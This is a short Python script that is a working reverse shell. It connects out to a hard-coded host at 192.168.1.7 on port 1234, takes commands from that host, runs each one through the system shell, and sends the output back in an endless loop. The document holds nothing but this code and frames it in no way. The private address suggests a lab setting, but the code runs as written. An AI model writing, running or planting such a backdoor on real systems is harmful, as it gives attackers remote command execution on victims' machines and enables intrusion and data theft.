#!/usr/bin/python3
import socket
import subprocess

def execute_commands(command):
    return subprocess.check_output(command,shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("192.168.1.7",1234))


while(True):
    command = connection.recv(1024).decode('ascii')
    command_result = execute_commands(str(command))
    connection.send(command_result)

connection.close()